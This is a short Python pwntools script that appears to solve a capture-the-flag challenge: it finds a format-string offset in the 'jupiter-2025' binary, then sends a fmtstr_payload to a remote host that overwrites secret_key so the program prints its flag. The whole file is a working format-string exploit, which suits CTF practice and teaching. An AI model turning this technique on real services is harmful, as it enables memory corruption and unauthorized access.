import os
from pwn import *

BIN = '.build/jupiter-2025' if os.path.exists('.build/jupiter-2025') else 'jupiter-2025'
exe = ELF(BIN)
context.binary = exe

HOST = os.environ.get('HOST', 'localhost')
PORT = int(os.environ.get('PORT', 25607))

# Auto-discover the format-string offset by running the binary locally.
def exec_fmt(payload):
	p = exe.process()
	p.sendlineafter(b': ', payload)
	return p.recvall()

fmt = FmtStr(exec_fmt)

p = remote(HOST, PORT)

# Overwrite secret_key with 0x1337c0de so main() calls read_flag().
payload = fmtstr_payload(fmt.offset, {exe.sym['secret_key']: 0x1337c0de})

info(f"[~] Payload = {payload}, len = {len(payload)}")

p.sendlineafter(b': ', payload)

# read_flag() prints "Secret Flag: sun{...}" to stdout.
print(p.recvall(timeout=5).decode(errors='replace'))
